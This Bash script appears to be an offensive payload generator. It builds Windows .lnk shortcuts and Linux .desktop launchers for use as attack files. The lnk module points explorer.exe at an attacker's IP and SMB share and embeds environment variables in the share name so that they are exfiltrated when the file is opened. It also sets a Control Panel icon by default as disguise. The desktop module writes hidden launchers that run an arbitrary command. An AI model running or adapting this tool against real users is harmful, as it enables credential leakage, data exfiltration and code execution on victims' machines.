#!/usr/bin/env bash

# Immediately enable “strict mode” so that:
#  - any unbound variable causes an error (-u)
#  - any failed command causes an exit (-e)
#  - any failure in a pipeline causes the pipeline to fail (-o pipefail)
set -euo pipefail

VERSION=1    # <–– initialize VERSION to avoid unbound errors under strict mode

# Initialize variables to avoid unbound errors under strict mode:
ARGUMENTS=""
COMMAND=""
IP=""
ENVIRONMENT=""
SHARE=""
NAME=""
DESCRIPTION=""
ICON=""
WINDOW=""
WORKINGDIRECTORY=""
OUTPUT=""
PAYLOAD=""

function print() {
    local status="${1}"
    local message="${2}"
    local color

    case "${status}" in
        information) color="\033[34m[*]\033[0m" ;;  # Blue
        progress) color="\033[1;34m[*]\033[0m" ;;   # Bold Blue
        completed) color="\033[1;32m[+]\033[0m" ;;  # Bold Green
        error) color="\033[1;31m[-]\033[0m" ;;      # Bold Red
    esac

    echo -e "${color} ${message}"
}

function quit() {
    print "information" "Terminating program..."
    exit "${1}"
}

function check_program() {
    type -P "${1}" 2>/dev/null
}

function check_dependencies() {
    local -a programs=("getopt" "wine" "desktop-file-edit")
    local -a missing=() # <–– initialize missing to avoid unbound errors under strict mode
    local -a powershell=("${WINEPREFIX_DIRECTORY}/drive_c/Program Files/PowerShell/"*/pwsh.exe)

    if [[ ! -d "${WINEPREFIX_DIRECTORY}" ]]
    then
        print "error" "Directory not found: ${WINEPREFIX_DIRECTORY}. WINEPREFIX directory has not been initialized!"
        quit 1
    fi

    for program in "${programs[@]}"
    do
        if [[ -z $(check_program "${program}") ]]
        then
            if [[ "${program}" == "getopt" ]]
            then
                missing+=("util-linux")
            elif [[ "${program}" == "desktop-file-edit" ]]
            then
                missing+=("desktop-file-utils")
            else
                missing+=("${program}")
            fi
        fi
    done

    shopt -s nullglob
    [[ ! -f "${powershell[0]}" ]] && missing+=("powershell")
    shopt -u nullglob

    if ((${#missing[@]} > 0)) # <–– if missing is not empty, print an error and quit
    then
        print "error" "Required dependencies: ${missing[*]}"
        quit 1
    fi
}

function random_string() {
    local -a characters=({a..z} {A..Z})
    local length=$((RANDOM % 11 + 6))  # A length of characters between 6 and 16
    local string=""
    local random_index

    for ((i = 0; i < length; i++))
    do
        random_index=$((RANDOM % ${#characters[@]}))
        string+=${characters[$random_index]}
    done

    echo "${string}"
}

function generate() {
    local payload="${1}"


    function shell_link() {
        local -A windowstyle=(
            [normal]=1
            [maximized]=3
            [minimized]=7
        )
        local temp
        local temporary_file
        local script
        arguments=("WINEDEBUG=-all" "WINEARCH=win64"
                "WINEPREFIX='${WINEPREFIX_DIRECTORY}'" "wine")

        script="\$WScriptShell = New-Object -ComObject WScript.Shell\n"
        script+="\$ShortcutPath = \"${OUTPUT}\"\n"
        script+="\$Shortcut = \$WScriptShell.CreateShortcut(\$ShortcutPath)\n"

        if [[ -n "${COMMAND}" ]]
        then
            if [[ -n "${ARGUMENTS}" && "${#ARGUMENTS}" -lt 260 ]]
            then
                script+="\$Shortcut.TargetPath = '${COMMAND}'\n"
                script+="\$Shortcut.Arguments = '${ARGUMENTS}'\n"
            elif (("${#ARGUMENTS}" >= 260))
            then
                print "error" "Arguments must not exceed more than 260 characters"
                quit 1
            elif [[ -z "${ARGUMENTS}" ]]
            then
                print "error" "Command and arguments must be passed!"
                quit 1
            fi
        fi

        if [[ -z "${IP}" ]]
        then
            print "error" "IP parameter must at least be passed!"
            quit 1
        else
            local unc
            if [[ -z "${SHARE}" ]]
            then
                SHARE="$(random_string)"
                if [[ -n "${ENVIRONMENT}" ]]
                then
                    while IFS="," read -ra variables
                    do
                        for variable in "${variables[@]}"
                        do
                            temp+="%${variable}%,"
                        done
                    done <<< "${ENVIRONMENT}"
                    # Remove trailing comma
                    ENVIRONMENT="${temp%,}"
                    SHARE="${SHARE}_${ENVIRONMENT}"
                fi

                if [[ -z "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE}"
                elif [[ -n "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                fi
            elif [[ -n "${SHARE}" ]]
            then
                if [[ -z "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE}"
                elif [[ -n "${NAME}" ]]
                then
                    unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                fi
            fi

            script+="\$Shortcut.TargetPath = 'C:/Windows/explorer.exe'\n"
            script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
        fi

        if [[ -n "${DESCRIPTION}" ]]
        then
            script+="\$Shortcut.Description = \"${DESCRIPTION}\""
        fi

        # Using a custom index icon
        if [[ -n "${ICON}" ]]
        then
            script+="\$Shortcut.IconLocation = '${ICON}'\n"
        elif [[ -z "${ICON}" ]]
        then
            # Will set to control panel icon by default
            script+="\$Shortcut.IconLocation = 'shell32.dll,21'\n"
        fi

        if [[ -n "${WINDOW}" ]]
        then
            if [[ -z "${windowstyle[${WINDOW}]+_}" ]]
            then
                print "error" "Invalid window style: ${WINDOW}"
                quit 1
            fi
            script+="\$Shortcut.WindowStyle = ${windowstyle[${WINDOW}]}\n"
        fi

        if [[ -n "${WORKINGDIRECTORY}" ]]
        then
            script+="\$Shortcut.WorkingDirectory = '${WORKINGDIRECTORY}'\n"
        fi

        script+="\$Shortcut.Save()\n"

        # Save the temporary PowerShell script then remove it after generation
        temporary_file=$(mktemp --suffix '.ps1')
        echo -e "${script}" > "${temporary_file}"
        eval "${arguments[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
        rm -f "${temporary_file}"

        print "completed" "Payload has been generated!"
    }

    function desktop_entry() {
        arguments=("desktop-file-edit")

        if [[ -n "${NAME}" ]]
        then
            arguments+=("--set-key='Encoding'")
            arguments+=("--set-value='UTF-8'")
            arguments+=("--set-key='Name'")
            arguments+=("--set-value='${NAME}'")
            arguments+=("--set-key='Version'")
            arguments+=("--set-value='1.0'")
        else
            print "error" "Name must be passed!"
            quit 1
        fi

        if [[ -n "${COMMAND}" && -n "${ARGUMENTS}" ]]
        then
            arguments+=("--set-key='Exec'")
            arguments+=("--set-value='${COMMAND} ${ARGUMENTS}'")
        elif [[ -n "${COMMAND}" ]]
        then
            arguments+=("--set-key='Exec'")
            arguments+=("--set-value='${COMMAND}'")
        else
            print "error" "At least command and/or arguments must be passed!"
            quit 1
        fi

        if [[ -n "${DESCRIPTION}" ]]
        then
            arguments+=("--set-comment='${DESCRIPTION}'")
        fi

        if (( ${#ARGUMENTS} >= 260 ))
        then
            print "error" "Arguments must not exceed more than 260 characters"
            quit 1
        fi

        if [[ -n "${WORKINGDIRECTORY}" ]]
        then
            arguments+=("--set-key='Path'")
            arguments+=("--set-value='${WORKINGDIRECTORY}'")
        fi

        if [[ -n "${ICON}" ]]
        then
            arguments+=("--set-icon='${ICON}'")
        fi

        if [[ -z "${WINDOW}" ]]
        then
            arguments+=("--set-key=\"Terminal\"")
            arguments+=("--set-value=\"false\"")
        elif [[ -n "${WINDOW}" ]]
        then
            # Make the application run in terminal if set to true otherwise false
            if [[ "${WINDOW}" == "true" || "${WINDOW}" == "false" ]]
            then
                arguments+=("--set-key=\"Terminal\"")
                arguments+=("--set-value=\"${WINDOW}\"")
            else
                print "error" "The Terminal must be set either 'true' or 'false'!"
            fi
        fi
        arguments+=("--set-key=\"Type\"")
        arguments+=("--set-value=\"Application\"")
        # Do not appear in application menu
        arguments+=("--set-key=\"NoDisplay\"")
        arguments+=("--set-value=\"true\"")
        # The desktop entry must be usable and not hidden
        arguments+=("--set-key=\"Hidden\"")
        arguments+=("--set-value=\"false\"")
        arguments+=("--remove-key=\"X-Desktop-File-Install-Version\"")
        touch "${OUTPUT}"

        print "completed" "Payload has been generated!"
        eval "${arguments[*]} ${OUTPUT} &>/dev/null"
    }

    if [[ -f "${OUTPUT}" ]]
    then
        rm -f "${OUTPUT}"
    fi

    case "${payload}" in
        "lnk")
            shell_link
            ;;
        "desktop")
            desktop_entry
            ;;
        *)
            print "error" "Available payloads are: 'lnk' and 'desktop'!"
            quit 1
            ;;
        esac
}

function usage() {
    echo "Usage: $(basename ${0}) <flags>
Flags:
    -p, --payload                       Specify a payload module ('lnk', 'desktop').
    -c, --command                       Specify a command to execute.
    -a, --arguments                     Optionally pass the arguments (except it is
                                        mandatory for 'lnk' payload module).
    -i, --ip                            Specify an IP address/hostname (applies with
                                        'lnk' payload module).
    -e, --environment                   Optionally pass the environment variables to
                                        exfiltrate.
    -s, --share                         Specify an SMB share (applies with -h flag
                                        when it's optional for 'lnk' payload module).
    -n, --name                          Specify a name. It is optional when 'lnk'
                                        payload module is specified (applies with -h flag).
                                        For 'desktop' payload module it is mandatory.
    --icon                              Specify a custom icon.
    -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                        'normal' is set by default if not specified.
                                        The available windowstyles are: 'normal', 'maximized',
                                        and 'minimized'. For 'desktop' payload it is set to
                                        'false', the available options are: 'true' and 'false'.
    --workingdirectory                  Specify a working directory.
    -o, --output                        Specify an output.
    -v, --version                       Display the program's version number.
    -h, --help                          Display the help menu."

    exit 0
}

function main() {
    local directory

    local options="p:c:a:i:e:s:n:d:w:o:v:h"
    local long_options="payload:,command:,arguments:,ip:,environment:,share:,name:,description:,icon:,window:,workingdirectory:,output:,version:,help"
    local parsed_options=$(getopt -o "${options}" -l "${long_options}" -n "$(basename "${0}")" -- "${@}")
    
    WINEPREFIX_DIRECTORY="${HOME}/.wine"

    if ((${?} != 0))
    then
        print "error" "Failed to parse options... Exiting." >&2
        quit 1
    fi

    eval set -- "${parsed_options}"

    while true
    do
        case "${1}" in
            -p | --payload)
                PAYLOAD="${2,,}"
                shift 2
                ;;
            -c | --command)
                COMMAND="${2}"
                shift 2
                ;;
            -a | --arguments)
                ARGUMENTS="${2}"
                shift 2
                ;;
            -i | --ip)
                IP="${2}"
                shift 2
                ;;
            -e | --environment)
                ENVIRONMENT="${2}"
                shift 2
                ;;
            -s | --share)
                SHARE="${2}"
                shift 2
                ;;
            -n | --name)
                NAME="${2}"
                shift 2
                ;;
            -d | --description)
                DESCRIPTION="${2}"
                shift 2
                ;;
            --icon)
                ICON="${2}"
                shift 2
                ;;
            -w | --window)
                WINDOW="${2,,}"
                shift 2
                ;;
            --workingdirectory)
                WORKINGDIRECTORY="${2}"
                shift 2
                ;;
            -o | --output)
                OUTPUT="${2}"
                shift 2
                ;;
            -v | --version)
                VERSION=1
                shift
                ;;
            -h | --help)
                usage
                ;;
            --)
                shift
                break
                ;;
            *)
                print "error" "Invalid option: ${1}" >&2
                quit 1
                ;;
        esac
    done

    trap quit SIGINT
    check_dependencies

    ((VERSION == 1)) && echo "${0} version: v1.0"

    if [[ -n "${OUTPUT}" ]]
    then
        directory=$(dirname "${OUTPUT}")

        if [[ -d "${directory}" && -w "${directory}" ]]
        then
            generate "${PAYLOAD}"
        elif [[ ! -d "${directory}" ]]
        then
            print "error" "Directory path does not exist: ${directory}"
        elif [[ -d "${directory}" && ! -w "${directory}" ]]
        then
            print "error" "Permission denied: Cannot generate payload to directory path: ${directory}."
        fi
    else
        print "error" "Output file must be specified!"
        quit 1
    fi
}

main "${@}"
